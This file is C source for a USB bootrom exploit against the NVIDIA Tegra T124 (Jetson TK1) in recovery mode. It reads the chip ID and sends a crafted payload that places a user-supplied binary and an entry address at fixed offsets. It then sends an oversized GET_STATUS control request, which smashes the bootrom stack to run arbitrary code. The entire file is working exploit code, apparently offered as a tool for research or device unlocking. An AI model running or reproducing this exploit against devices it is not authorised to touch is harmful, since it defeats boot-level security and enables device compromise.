#include <fcntl.h>
#include <libusb.h>
#include <linux/usbdevice_fs.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#define JETSON_TK1_PID 0x0955
#define JETSON_TK1_VID 0x7140

#define USB_CTRL_DEVICE_ENDPOINT_TO_HOST 0x82
#define USB_CTRL_GET_STATUS 0x00

#define USB_BULK_TIMEOUT 500

#define RCM_EP1_IN      0x81
#define RCM_EP1_OUT     0x01
#define RCM_CHIP_ID_LEN 0x10
#define RCM_PAYLOAD_LEN 0x7000
#define RCM_PAYLOAD_INIT_POS 0x284
#define RCM_MEMCPY_RET_POS 0x5C4C

#define BOOTROM_USB_BUF1       0x40004000
#define BOOTROM_USB_BUF2       0x40008000
#define BOOTROM_SMASH_TARGET   0x4000DCD8

#define MAX_BIN_FILE_SIZE RCM_MEMCPY_RET_POS - RCM_PAYLOAD_INIT_POS

void print_hex_memory(void *mem, size_t size) {
  uint8_t *p = (uint8_t *)mem;
  for (int i = 0; i < size ; i++) {
    if (((i % 16) == 0) && i)
      printf("\n");
    printf("0x%02x ", p[i]);
  }
  printf("\n");
}

struct setup_data {
	uint8_t bRequestType;
	uint8_t bRequest;
	uint16_t wValue;
	uint16_t wIndex;
	uint16_t wLength;
	uint8_t data[0xffff];
};

int main(int argc, char *argv[]) {

  uint8_t ret;

  if (argc != 2) {
    printf("Error: invalid argument count. shofel2_t124 payload.bin\n");
    return -1;
  }

  // ---- FIND K1 RCM ----
  //TODO: Remove libusb dependency...
  libusb_init(NULL);
  libusb_device_handle *dev_h = NULL;
  printf("Waiting T124 to enter RCM mode. Note: root permission could be required.\n");
  while(!dev_h) {
    dev_h = libusb_open_device_with_vid_pid(NULL,  (uint16_t)JETSON_TK1_PID, (uint16_t)JETSON_TK1_VID);
    usleep(500);
  }
  struct libusb_device *dev = libusb_get_device(dev_h);
  uint8_t bus = libusb_get_bus_number(dev);
  uint8_t add = libusb_get_device_address(dev);
  libusb_close(dev_h);
  libusb_exit(NULL);

  char path[256];
  sprintf(path, "/dev/bus/usb/%03d/%03d", bus, add);
  printf("USB File Path: %s\n", path);
  int usb_fd = open(path, O_RDWR);
  if (usb_fd == -1) {
    perror(NULL);
    return -1;
  }
  //-----------------------

  // ---- INIT RCM ----
  uint8_t chip_id_buf[RCM_CHIP_ID_LEN];
  memset(&chip_id_buf, 0, sizeof (chip_id_buf));

  struct usbdevfs_bulktransfer usb_rcm_init;
  memset(&usb_rcm_init, 0, sizeof (usb_rcm_init));
  usb_rcm_init.ep = RCM_EP1_IN;
  usb_rcm_init.len = RCM_CHIP_ID_LEN;
  usb_rcm_init.timeout = USB_BULK_TIMEOUT;
  usb_rcm_init.data = chip_id_buf;

  ret = ioctl(usb_fd, USBDEVFS_BULK, &usb_rcm_init);
  if (ret != 0x10) {
    printf("Error: Couldn't read Chip ID. Please reset T124 in RCM mode again.\n");
    return -1;
  }
  printf("Chip ID: ");
  print_hex_memory(chip_id_buf, RCM_CHIP_ID_LEN);
  //-----------------------

  // ---- SEND PAYLOAD ----
  uint8_t payload_buf[RCM_PAYLOAD_LEN];
  memset(payload_buf, 0x00, sizeof(payload_buf));
  
  const uint8_t rcm_len[4] = { 0x74, 0x22, 0x03, 0x00 }; // 0x00032274 Bytes
  const uint8_t payload_entry[4] = {0x01, 0xe0, 0x00, 0x40}; // 0x4000E000|1 (|1 Thumb mode bit) 

  // TODO: Use IRAM space after memcpy return pos. Probably not needed by any T124 payload.
  uint8_t bin_buf[MAX_BIN_FILE_SIZE];
  uint32_t n_read = 0;
  int bin_fd = open(argv[1], O_RDONLY);
  if (bin_fd == -1) {
    printf("Error: Couldn't open the payload file.\n");
    return -1;
  }
  struct stat bin_stat;
  fstat(bin_fd, &bin_stat);
  if (bin_stat.st_size > MAX_BIN_FILE_SIZE) {
    printf("Error: Payload file exceeds max payload size: %d bytes.\n", MAX_BIN_FILE_SIZE);
    return -1;
  }

  n_read = read(bin_fd, bin_buf, MAX_BIN_FILE_SIZE);

  memcpy(payload_buf, rcm_len, 0x4);
  memcpy(&payload_buf[RCM_PAYLOAD_INIT_POS], bin_buf, n_read);
  memcpy(&payload_buf[RCM_MEMCPY_RET_POS], payload_entry, 0x4);

  struct usbdevfs_bulktransfer usb_rcm_cmd;
  memset(&usb_rcm_cmd, 0, sizeof (usb_rcm_init));
  usb_rcm_cmd.ep = RCM_EP1_OUT;
  usb_rcm_cmd.len = RCM_PAYLOAD_LEN;
  usb_rcm_cmd.timeout = USB_BULK_TIMEOUT;
  usb_rcm_cmd.data = payload_buf;

  ret = ioctl(usb_fd, USBDEVFS_BULK, &usb_rcm_cmd);
  if (ret != 0) {
    printf("Error: Couldn't send RCM CMD.\n");
    return -1;
  }
  //----------------------

  // ---- RUN EXPLOIT ----
  struct setup_data hacky_get_status_buf;
  memset(&hacky_get_status_buf, 0, sizeof (hacky_get_status_buf));
  hacky_get_status_buf.bRequestType = USB_CTRL_DEVICE_ENDPOINT_TO_HOST;
  hacky_get_status_buf.bRequest = USB_CTRL_GET_STATUS;
  hacky_get_status_buf.wValue = 0;
  hacky_get_status_buf.wIndex = 0;
  hacky_get_status_buf.wLength = BOOTROM_SMASH_TARGET - BOOTROM_USB_BUF2; // 0x5CD8

  struct usbdevfs_urb usb_hacky_get_status;
  memset(&usb_hacky_get_status, 0, sizeof (usb_hacky_get_status));
  usb_hacky_get_status.type          = USBDEVFS_URB_TYPE_CONTROL;
  usb_hacky_get_status.endpoint      = 0x0;
  usb_hacky_get_status.buffer        = &hacky_get_status_buf;
  usb_hacky_get_status.buffer_length = sizeof(hacky_get_status_buf);

  ioctl(usb_fd, USBDEVFS_SUBMITURB, &usb_hacky_get_status);
  ioctl(usb_fd, USBDEVFS_REAPURB32, 0);
  
  if (usb_hacky_get_status.status == 0) {
    printf("Error: Hacky Get Status finished correctly... Not cool :-(\n");
    print_hex_memory(hacky_get_status_buf.data, 0x1000);
    return -1;
  }

  printf("Hacky Get Status returned error... Probably the stack got smashed, Congrats :-)\n");
  //----------------------

}

